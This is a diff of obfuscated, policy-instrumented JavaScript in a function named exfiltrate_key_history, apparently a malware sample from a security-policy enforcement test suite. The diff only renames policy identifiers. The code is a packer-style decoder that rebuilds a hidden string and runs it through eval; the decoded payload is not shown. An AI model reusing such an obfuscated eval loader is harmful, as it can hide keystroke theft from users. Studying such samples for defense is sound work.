@@ -4,7 +4,7 @@ function exfiltrate_key_history() {
       return _0x1636[6]
     }
     function v1(_0x9e37x5$$1) {
-      introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+      introspect(JAM.policy.p1) {
         return _0x9e37x6[_0x9e37x5$$1]
       }
     }
@@ -14,7 +14,7 @@ function exfiltrate_key_history() {
     _0x9e37x5 = v0;
     var v21 = _0x1636[5];
     var v22 = _0x1636[4];
-    var v15 = JAM.call(JAM.get(v21, v22, JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074), v21, [/^/, String]);
+    var v15 = JAM.call(JAM.get(v21, v22, JAM.policy.p1), v21, [/^/, String]);
     var v7 = !v15;
     if(v7) {
       var v6 = _0x9e37x3;
@@ -22,7 +22,7 @@ function exfiltrate_key_history() {
       for(;v6;) {
         var v4 = _0x9e37x6;
         var v5 = _0x9e37x3.toString(_0x9e37x2);
-        introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+        introspect(JAM.policy.p1) {
           var v16 = _0x9e37x4[_0x9e37x3]
         }
         var v23 = !v16;
@@ -40,7 +40,7 @@ function exfiltrate_key_history() {
     var v12 = _0x9e37x3;
     _0x9e37x3 = _0x9e37x3 - 1;
     for(;v12;) {
-      introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+      introspect(JAM.policy.p1) {
         var v11 = _0x9e37x4[_0x9e37x3]
       }
       if(v11) {
@@ -52,10 +52,10 @@ function exfiltrate_key_history() {
         var v17 = v24 + v25;
         var v18 = _0x1636[8];
         var v9 = new RegExp(v17, v18);
-        introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+        introspect(JAM.policy.p1) {
           var v10 = _0x9e37x4[_0x9e37x3]
         }
-        _0x9e37x1 = JAM.call(JAM.get(_0x9e37x1, v8, JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074), _0x9e37x1, [v9, v10])
+        _0x9e37x1 = JAM.call(JAM.get(_0x9e37x1, v8, JAM.policy.p1), _0x9e37x1, [v9, v10])
       }
       v12 = _0x9e37x3;
       _0x9e37x3 = _0x9e37x3 - 1
@@ -67,7 +67,7 @@ function exfiltrate_key_history() {
   var v26 = _0x1636[3];
   var v27 = _0x1636[2];
   var v28 = _0x1636[1];
-  var v20 = JAM.call(JAM.get(v26, v27, JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074), v26, [v28]);
+  var v20 = JAM.call(JAM.get(v26, v27, JAM.policy.p1), v26, [v28]);
   var v13 = v3(v19, 15, 15, v20, 0, {});
   if(JAM.isEval(eval)) {
     eval("introspect(JAM.policy.pFull) { " + v13 + " }")
